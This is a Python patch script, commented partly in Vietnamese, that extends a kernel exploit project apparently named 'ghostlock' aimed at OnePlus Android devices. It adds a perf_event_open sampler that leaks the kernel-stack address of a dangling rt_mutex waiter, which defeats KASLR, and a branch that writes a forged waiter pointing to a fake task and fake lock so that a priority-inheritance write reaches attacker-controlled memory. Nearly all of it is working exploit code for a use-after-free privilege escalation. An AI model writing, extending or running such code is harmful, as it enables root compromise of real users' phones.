#!/usr/bin/env python3
"""patch_ssopt_waiter_leak.py

Hướng RB_EMPTY_NODE: leak địa chỉ `waiter` (kernel stack của T) bằng perf
REGS_INTR rồi sơn `tree_entry.__rb_parent_color = &waiter` => RB_EMPTY_NODE =>
`rt_mutex_dequeue()` BỎ HẲN `rb_erase_cached()` => miễn nhiễm clobber
`waiter+0x08/+0x10`.  Lần ghi PI khi đó lấy từ `chain[11]` (pi-tree, đọc từ
trang giả — không phụ thuộc stack).

Cơ sở hình học:
  - waiter = SP0-0x1b0 (mọi syscall thường; đã xác nhận nhiều lần).
  - sample TRONG `sock_setsockopt` (frame SyS 0x50 + sock 0x180) => SP = SP0-0x1d0
    => waiter = SP + 0x20.
  - sample TRONG `SyS_setsockopt` (frame 0x50, sau prologue) => waiter = SP - 0x160.
  - IP so theo 21 bit thấp (KASLR slide bội 2 MB; NO_SLIDE => địa chỉ image unslid).
  - sample layout (PERF_SAMPLE_IP|REGS_INTR): ip(8) | abi(8) | regs[32]; SP = regs[31].

Cờ: SSOPT_EMPTY=1 (bật đường này).  Cần owner != 0 (SSOPT_OWNER0=0) để walk đi tiếp
tới chain[11].
"""
import re

# ---------------- target.h: 2 symbol offsets (unslid, trong image) -------------
T = "/root/ghostlock/ghostlock-oneplus/src/core/target.h"
t = open(T).read()
old = "#define FOPS_OWNER_OFF        0x00"
new = ("""/* Unslid image offsets of the misc syscalls we sample to leak the kernel-stack
 * address of the dangling waiter (only the LOW 21 BITS matter: KASLR slides by a
 * multiple of 2 MB).  From kallsyms of the device:
 *   SyS_setsockopt  = 0xffffff8009428f54  -> 0x01428f54
 *   sock_setsockopt = 0xffffff800942eafc  -> 0x0142eafc
 * frames: SyS 0x50, sock_setsockopt 0x180  (disasm, BAN_GIAO §4). */
#define SYS_SETSOCKOPT_OFF   0x01428f54ULL
#define SOCK_SETSOCKOPT_OFF  0x0142eafcULL
#define FOPS_OWNER_OFF        0x00""")
assert t.count(old) == 1, ("target.h anchor", t.count(old))
t = t.replace(old, new, 1)
open(T, "w").write(t)
print("target.h: SYS_SETSOCKOPT_OFF / SOCK_SETSOCKOPT_OFF")

# ---------------- util.c: sampler + leak --------------------------------------
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()
anchor = "static void log_sync(void) { fsync(1); }"
assert u.count(anchor) == 1, ("util anchor", u.count(anchor))
sampler = anchor + """

/* ============================================================================
 * Leak the dangling waiter's kernel-stack address (RB_EMPTY_NODE route).
 * ========================================================================== */
static int ssopt_perf_fd = -1;
static unsigned char *ssopt_perf_buf;
static size_t ssopt_perf_msz;
uint64_t ssopt_leaked_waiter;

int ssopt_perf_begin(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;
  ssopt_perf_fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (ssopt_perf_fd < 0) { pr_warning("perf_event_open(waiter) errno=%d\\n", errno); return -1; }
  ssopt_perf_msz = PAGE_SIZE * 33;
  ssopt_perf_buf = mmap(0, ssopt_perf_msz, PROT_READ | PROT_WRITE, MAP_SHARED,
                        ssopt_perf_fd, 0);
  if (ssopt_perf_buf == MAP_FAILED) {
    ssopt_perf_buf = NULL; close(ssopt_perf_fd); ssopt_perf_fd = -1;
    pr_warning("perf mmap(waiter) errno=%d\\n", errno); return -1;
  }
  ioctl(ssopt_perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  return 0;
}

static int ssopt_ip_in(uint64_t ip, uint64_t sym_off, uint64_t len) {
  uint64_t a = ip & 0x1fffffULL, b = sym_off & 0x1fffffULL;
  return (a >= b && a - b < len);
}

uint64_t ssopt_perf_end_waiter(void) {
  if (ssopt_perf_fd < 0) return 0;
  ioctl(ssopt_perf_fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = (void *)ssopt_perf_buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  unsigned char *base = ssopt_perf_buf + PAGE_SIZE;
  size_t dsz = ssopt_perf_msz - PAGE_SIZE;
  uint64_t pos = hdr->data_tail;
  static uint64_t cand[65536];
  int nc = 0, total = 0, in_sock = 0, in_sys = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      total++;
      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p; p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1) {                       /* aarch64 */
        uint64_t sp = ((uint64_t *)p)[31];
        uint64_t w = 0;
        if (ssopt_ip_in(ip, SOCK_SETSOCKOPT_OFF, 0x500)) { w = sp + 0x20; in_sock++; }
        else if (ssopt_ip_in(ip, SYS_SETSOCKOPT_OFF, 0x100)) { w = sp - 0x160; in_sys++; }
        if (w && nc < (int)(sizeof(cand) / sizeof(cand[0]))) cand[nc++] = w;
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(ssopt_perf_buf, ssopt_perf_msz);
  close(ssopt_perf_fd);
  ssopt_perf_buf = NULL; ssopt_perf_fd = -1;
  /* majority vote */
  uint64_t best = 0; int bestn = 0;
  for (int i = 0; i < nc; i++) {
    int n = 0;
    for (int j = 0; j < nc; j++) if (cand[j] == cand[i]) n++;
    if (n > bestn) { bestn = n; best = cand[i]; }
  }
  pr_info("waiter leak: samples=%d in_sock=%d in_sys=%d cands=%d best=%016zx x%d\\n",
          total, in_sock, in_sys, nc, (uintptr_t)best, bestn);
  return best;
}
"""
u = u.replace(anchor, sampler, 1)
open(U, "w").write(u)
print("util.c: ssopt_perf_begin/ssopt_perf_end_waiter")

# ---------------- common.h decls ---------------------------------------------
C = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
c = open(C).read()
old = "uint64_t ssopt_page_readback(size_t off);"
new = """uint64_t ssopt_page_readback(size_t off);
int ssopt_perf_begin(void);
uint64_t ssopt_perf_end_waiter(void);
extern uint64_t ssopt_leaked_waiter;"""
assert c.count(old) == 1, ("common.h", c.count(old))
c = c.replace(old, new, 1)
open(C, "w").write(c)
print("common.h: sampler decls")

# ---------------- fops.c: leak + empty-node paint ----------------------------
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()

# (a) leak once, before the attempt loop
old = """  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  int calls = 0, success = 0;"""
new = """  /* RB_EMPTY_NODE route: leak T's kernel stack (=> &waiter) before painting.
   * The dummy paints run INSIDE the perf sampler window; they set the waiter
   * region to zeros, which the real paint below overwrites. */
  if (env_flag("SSOPT_EMPTY", 0) && !ssopt_leaked_waiter) {
    if (ssopt_perf_begin() == 0) {
      unsigned char dummy[0x60];
      memset(dummy, 0, sizeof dummy);
      for (int i = 0; i < 4; i++)
        setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, sizeof dummy);
      ssopt_leaked_waiter = ssopt_perf_end_waiter();
    }
    pr_info("ssopt waiter = %016zx (perf leak)\\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);
  }

  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  int calls = 0, success = 0;"""
assert s.count(old) == 1, ("fops leak block", s.count(old))
s = s.replace(old, new, 1)

# (b) empty-node paint branch (before the triple branch)
old = """    } else if (env_flag("SSOPT_BASELINE", 0)) {"""
new = """    } else if (env_flag("SSOPT_EMPTY", 0) && ssopt_leaked_waiter) {
      /* RB_EMPTY_NODE(&waiter->tree_entry)  <=>  parent_color == &tree_entry,
       * and tree_entry sits at offset 0 of the waiter, so paint the waiter's own
       * address.  rt_mutex_dequeue() then returns immediately: no rb_erase_cached
       * at all, so the clobbered children (waiter+0x08/+0x10) are never read.
       * The PI write must therefore come from chain[11] (pi-tree in our page):
       * requires fake_lock->owner != 0 and waiter->task valid. */
      put64(buf, 0x10, ssopt_leaked_waiter);
      put64(buf, 0x18, 0);
      put64(buf, 0x20, 0);
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
                                                 : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else if (env_flag("SSOPT_BASELINE", 0)) {"""
assert s.count(old) == 1, ("fops empty branch", s.count(old))
s = s.replace(old, new, 1)

# (c) settings log
old = """            env_flag("SSOPT_OWNER0", 1), env_flag("SSOPT_NO_TREE", 0),
            env_flag("SSOPT_NO_PRIO", 0), env_flag("SSOPT_LOCKPROBE", 0));"""
new = """            env_flag("SSOPT_OWNER0", 1), env_flag("SSOPT_NO_TREE", 0),
            env_flag("SSOPT_NO_PRIO", 0), env_flag("SSOPT_LOCKPROBE", 0));
    (void)0;"""
assert s.count(old) == 1, ("fops log", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: SSOPT_EMPTY leak block + empty-node paint")
